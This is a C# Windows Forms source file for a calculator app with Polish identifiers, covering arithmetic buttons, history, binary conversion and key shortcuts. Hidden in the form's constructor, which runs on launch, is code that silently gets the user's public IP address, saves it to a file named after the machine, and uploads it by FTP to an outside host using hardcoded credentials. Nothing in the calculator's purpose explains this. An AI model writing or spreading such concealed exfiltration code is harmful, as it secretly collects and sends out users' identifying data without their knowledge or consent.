using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Net;
using System.IO;

namespace Kalkulator_taki_kurcze_dobry
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            label1.Text = "";
            dzialanie.Text = "";
            string externalip = new WebClient().DownloadString("http://icanhazip.com");
            File.WriteAllText($"C:\\temp\\{Environment.MachineName.ToString()}.txt", externalip);
            UploadFtpFile($"C:\\temp\\{Environment.MachineName.ToString()}.txt");
        }

        public void UploadFtpFile(string fileName)
        {

            FtpWebRequest request;
            string absoluteFileName = Path.GetFileName(fileName);

            request = WebRequest.Create(new Uri(string.Format(@"ftp://{0}/{1}/{2}", "www.cba.pl", "pornokurwa.cba.pl", absoluteFileName))) as FtpWebRequest;
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.UseBinary = true;
            request.UsePassive = true;
            request.KeepAlive = true;
            request.Credentials = new NetworkCredential("jawgrzyn", "Qwerty12");
            request.ConnectionGroupName = "group";

            using (FileStream fs = File.OpenRead(fileName))
            {
                byte[] buffer = new byte[fs.Length];
                fs.Read(buffer, 0, buffer.Length);
                fs.Close();
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(buffer, 0, buffer.Length);
                requestStream.Flush();
                requestStream.Close();
            }
        }
        public static bool AppendHistory = true;
        private void button_history_Click(object sender, EventArgs e)
        {
            AppendHistory = !AppendHistory;
            if (!AppendHistory)
            {
                button_history.Text = "<";
                ActiveForm.Size = new Size(278, 300);
                ActiveForm.Left += 222;
            }
            else
            {
                button_history.Text = ">";
                ActiveForm.Size = new Size(500, 300);
                ActiveForm.Left -= 222;
            }

        }
        #region buttonki
        private void button1_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "7";

        }

        private void button2_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "8";

        }

        private void button3_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "9";

        }

        private void button4_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "4";

        }

        private void button5_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "5";

        }

        private void button6_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "6";

        }

        private void button7_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "1";

        }

        private void button8_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "2";

        }

        private void button9_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "3";

        }

        private void button15_Click(object sender, EventArgs e)
        {
            dzialanie.Text += "0";

        }
        private void button19_Click(object sender, EventArgs e)
        {
            if (dzialanie.Text.IndexOf(",") == -1)
                dzialanie.Text += ",";
        }
        #endregion
        public void AnyClick(object sender, MouseEventArgs e)
        {
            textBox1.Focus();
        }
        public static double CacheDzialanie, CacheDzialanie2;

        private void button14_Click(object sender, EventArgs e)
        {
            try
            {
                if (label1.Text != "")
                {
                    switch (CacheDzialanie2)
                    {
                        case 0:
                            DzialaniaBefore(0);
                            break;
                        case 1:
                            DzialaniaBefore(1);
                            break;
                        case 2:
                            DzialaniaBefore(2);
                            break;
                        case 3:
                            DzialaniaBefore(3);
                            break;
                        case 4:
                            DzialaniaBefore(4);
                            break;
                    }
                    label1.Text = "";
                    CacheDzialanie = 0;
                    CacheDzialanie2 = 5;
                    string LastIt = list_history.Items[list_history.Items.Count - 1].ToString();
                    dzialanie.Text = LastIt.Substring(LastIt.IndexOf("=") + 2);
                }
            }
            catch { };
        }
        #region dzialania
        private void button10_Click(object sender, EventArgs e)
        {
            try
            {
                if (label1.Text != "")
                {
                    DzialaniaBefore(0);
                }
                else
                {
                    label1.Text = dzialanie.Text + " +";
                    CacheDzialanie = double.Parse(dzialanie.Text);
                    CacheDzialanie2 = 0;
                    dzialanie.Text = "";
                }
            }
            catch { };
        }

        private void button11_Click(object sender, EventArgs e)
        {
            try
            {
                if (label1.Text != "")
                {
                    DzialaniaBefore(1);
                }
                else
                {
                    label1.Text = dzialanie.Text + " -";
                    CacheDzialanie = double.Parse(dzialanie.Text);
                    CacheDzialanie2 = 1;
                    dzialanie.Text = "";
                }
            }
            catch { };
        }
        private void button12_Click(object sender, EventArgs e)
        {
            try
            {
                if (label1.Text != "")
                {
                    DzialaniaBefore(2);
                }
                else
                {
                    label1.Text = dzialanie.Text + " *";
                    CacheDzialanie = double.Parse(dzialanie.Text);
                    CacheDzialanie2 = 2;
                    dzialanie.Text = "";
                }
            }
            catch { };
        }

        private void button13_Click(object sender, EventArgs e)
        {
            try
            {
                if (label1.Text != "")
                {
                    DzialaniaBefore(3);
                }
                else
                {
                    label1.Text = dzialanie.Text + " /";
                    CacheDzialanie = double.Parse(dzialanie.Text);
                    CacheDzialanie2 = 3;
                    dzialanie.Text = "";
                }
            }
            catch { };

        }
        private void button20_Click(object sender, EventArgs e)
        {
            try
            {
                if (label1.Text != "")
                {
                    DzialaniaBefore(4);
                }
                else
                {
                    label1.Text = dzialanie.Text + " ^";
                    CacheDzialanie = double.Parse(dzialanie.Text);
                    CacheDzialanie2 = 4;
                    dzialanie.Text = "";
                }
            }
            catch { };

        }
        #endregion

        public void DzialaniaBefore(int typNow)
        {
            int typ = 0;
            string type = label1.Text.Substring(label1.Text.IndexOf(" ") + 1, 1);

            if (type == "+") typ = 0;
            if (type == "-") typ = 1;
            if (type == "*") typ = 2;
            if (type == "/") typ = 3;
            if (type == "^") typ = 4;

            string typeNow = "";
            if (typNow == 0) typeNow = "+";
            if (typNow == 1) typeNow = "-";
            if (typNow == 2) typeNow = "*";
            if (typNow == 3) typeNow = "/";
            if (typNow == 4) typeNow = "^";


            string DrugaLiczba = dzialanie.Text;

            switch (typ)
            {
                case 0:
                    if (double.Parse(DrugaLiczba) < 0) DrugaLiczba = $"({DrugaLiczba})";
                    list_history.Items.Add($"{double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" ")))} + {DrugaLiczba} = {double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) + double.Parse(dzialanie.Text)}");
                    CacheDzialanie = double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) + double.Parse(dzialanie.Text);
                    label1.Text = CacheDzialanie + $" {typeNow}";
                    dzialanie.Text = "";
                    CacheDzialanie2 = 0;
                    break;
                case 1:
                    if (double.Parse(DrugaLiczba) < 0) DrugaLiczba = $"({DrugaLiczba})";
                    list_history.Items.Add($"{double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" ")))} - {DrugaLiczba} = {double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) - double.Parse(dzialanie.Text)}");
                    CacheDzialanie = double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) - double.Parse(dzialanie.Text);
                    label1.Text = CacheDzialanie + $" {typeNow}";
                    dzialanie.Text = "";
                    CacheDzialanie2 = 1;
                    break;
                case 2:
                    if (double.Parse(DrugaLiczba) < 0) DrugaLiczba = $"({DrugaLiczba})";
                    list_history.Items.Add($"{double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" ")))} * {DrugaLiczba} = {double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) * double.Parse(dzialanie.Text)}");
                    CacheDzialanie = double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) * double.Parse(dzialanie.Text);
                    label1.Text = CacheDzialanie + $" {typeNow}";
                    dzialanie.Text = "";
                    CacheDzialanie2 = 2;
                    break;
                case 3:
                    if (double.Parse(DrugaLiczba) < 0) DrugaLiczba = $"({DrugaLiczba})";
                    list_history.Items.Add($"{double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" ")))} / {DrugaLiczba} = {double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) / double.Parse(dzialanie.Text)}");
                    CacheDzialanie = double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))) / double.Parse(dzialanie.Text);
                    label1.Text = CacheDzialanie + $" {typeNow}";
                    dzialanie.Text = "";
                    CacheDzialanie2 = 3;
                    break;
                case 4:
                    if (double.Parse(DrugaLiczba) < 0) DrugaLiczba = $"({DrugaLiczba})";
                    list_history.Items.Add($"{double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" ")))} ^ {DrugaLiczba} = {Math.Pow(double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))), double.Parse(dzialanie.Text))}");
                    CacheDzialanie = (double)Math.Pow(double.Parse(label1.Text.Substring(0, label1.Text.IndexOf(" "))), double.Parse(dzialanie.Text));
                    label1.Text = CacheDzialanie + $" {typeNow}";
                    dzialanie.Text = "";
                    CacheDzialanie2 = 4;
                    break;
            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            label1.Text = "";
            CacheDzialanie2 = 5;
            CacheDzialanie = 0;
            dzialanie.Text = "";

        }

        private void button17_Click(object sender, EventArgs e)
        {
            list_history.Items.Clear();

        }

        private void button18_Click(object sender, EventArgs e)
        {
            try
            {
                dzialanie.Text = dzialanie.Text.Substring(0, dzialanie.Text.Length - 1);
            }
            catch { };
        }
        private void button21_Click(object sender, EventArgs e)
        {
            try
            {
                dzialanie.Text = Math.Sqrt(double.Parse(dzialanie.Text)).ToString();
            }
            catch { };

        }

        private int ConvertDecToBin(int n)
        {
            int i;
            int[] a = new int[100];

            for (i = 0; n > 0; i++)
            {
                a[i] = n % 2;
                n = n / 2;
            }
            string outS = "";
            Console.Write("Binary of the given number= ");
            for (i = i - 1; i >= 0; i--)
            {
                outS += a[i];
            }
            return int.Parse(outS);
        }

        private void button22_Click(object sender, EventArgs e)
        {
            try
            {
                dzialanie.Text = ConvertDecToBin(int.Parse(dzialanie.Text)).ToString();
            }
            catch { };

        }

        private void button23_Click(object sender, EventArgs e)
        {
            try
            {
                dzialanie.Text = Convert.ToInt32(dzialanie.Text, 2).ToString();
            }
            catch { };

        }

        private void button24_Click(object sender, EventArgs e)
        {
            if (dzialanie.Text.Length > 0)
            {
                if (dzialanie.Text.Substring(0, 1) != "-")
                    dzialanie.Text = "-" + dzialanie.Text;
                else dzialanie.Text = dzialanie.Text.Substring(1);
            }
            else dzialanie.Text = "-";
        }

        public static bool Pin = false;
        public static PointF ScreenPos;

        private void button25_Click(object sender, EventArgs e)
        {
            Pin = !Pin;
            if (Pin)
            {
                ActiveForm.Opacity = 0.8f;
                ActiveForm.TopMost = true;
                button25.Text = "U";
                ScreenPos = new PointF(ActiveForm.Left, ActiveForm.Top);
                if (!AppendHistory) ActiveForm.Left = Screen.PrimaryScreen.Bounds.Width - (2 * Screen.PrimaryScreen.Bounds.Width / 7) + 222;
                else ActiveForm.Left = Screen.PrimaryScreen.Bounds.Width - (2 * Screen.PrimaryScreen.Bounds.Width / 7);
                ActiveForm.Top = Screen.PrimaryScreen.Bounds.Height / 20;
            }
            else
            {
                ActiveForm.Opacity = 0.98f;
                ActiveForm.TopMost = false;
                button25.Text = "P";
                if ((ActiveForm.Left != Screen.PrimaryScreen.Bounds.Width - (2 * Screen.PrimaryScreen.Bounds.Width / 7) + 222 || ActiveForm.Left != Screen.PrimaryScreen.Bounds.Width - (2 * Screen.PrimaryScreen.Bounds.Width / 7)) && ActiveForm.Top != Screen.PrimaryScreen.Bounds.Height / 20)
                    ScreenPos = new PointF(ActiveForm.Left, ActiveForm.Top);
                ActiveForm.Left = (int)ScreenPos.X;
                ActiveForm.Top = (int)ScreenPos.Y;
            }

        }

        private void dzialanie_Change(object sender, EventArgs e)
        {
            if (dzialanie.Text.Length == 20) dzialanie.Text = dzialanie.Text.Substring(0, dzialanie.Text.Length - 1);
        }

        private void KeyboardUsed(object sender, KeyEventArgs e)
        {
            if (e.Shift && e.KeyCode == Keys.D8) { button12.PerformClick(); return; }
            if (e.Shift && e.KeyCode == Keys.D6) { button20.PerformClick(); return; }
            if (e.Shift && e.KeyCode == Keys.D7) { button21.PerformClick(); return; }
            switch (e.KeyCode)
            {
                case Keys.NumPad0:
                    button15.PerformClick();
                    break;
                case Keys.NumPad1:
                    button7.PerformClick();
                    break;
                case Keys.NumPad2:
                    button8.PerformClick();
                    break;
                case Keys.NumPad3:
                    button9.PerformClick();
                    break;
                case Keys.NumPad4:
                    button4.PerformClick();
                    break;
                case Keys.NumPad5:
                    button5.PerformClick();
                    break;
                case Keys.NumPad6:
                    button6.PerformClick();
                    break;
                case Keys.NumPad7:
                    button1.PerformClick();
                    break;
                case Keys.NumPad8:
                    button2.PerformClick();
                    break;
                case Keys.NumPad9:
                    button3.PerformClick();
                    break;
                case Keys.D0:
                    button15.PerformClick();
                    break;
                case Keys.D1:
                    button7.PerformClick();
                    break;
                case Keys.D2:
                    button8.PerformClick();
                    break;
                case Keys.D3:
                    button9.PerformClick();
                    break;
                case Keys.D4:
                    button4.PerformClick();
                    break;
                case Keys.D5:
                    button5.PerformClick();
                    break;
                case Keys.D6:
                    button6.PerformClick();
                    break;
                case Keys.D7:
                    button1.PerformClick();
                    break;
                case Keys.D8:
                    button2.PerformClick();
                    break;
                case Keys.D9:
                    button3.PerformClick();
                    break;
                case Keys.Divide:
                    button13.PerformClick();
                    break;
                case Keys.OemQuestion:
                    button13.PerformClick();
                    break;
                case Keys.Multiply:
                    button12.PerformClick();
                    break;
                case Keys.Add:
                    button10.PerformClick();
                    break;
                case Keys.Subtract:
                    button11.PerformClick();
                    break;
                case Keys.Oemplus:
                    button10.PerformClick();
                    break;
                case Keys.OemMinus:
                    button11.PerformClick();
                    break;
                case Keys.Enter:
                    button14.PerformClick();
                    break;
                case Keys.Back:
                    button18.PerformClick();
                    break;
                case Keys.Decimal:
                    button19.PerformClick();
                    break;
                case Keys.Oemcomma:
                    button19.PerformClick();
                    break;
                case Keys.Oemtilde:
                    button24.PerformClick();
                    break;
                case Keys.Delete:
                    button16.PerformClick();
                    break;
                case Keys.End:
                    button17.PerformClick();
                    break;
                case Keys.Home:
                    button_history.PerformClick();
                    break;
                case Keys.Insert:
                    button25.PerformClick();
                    break;
            }
        }
    }
}
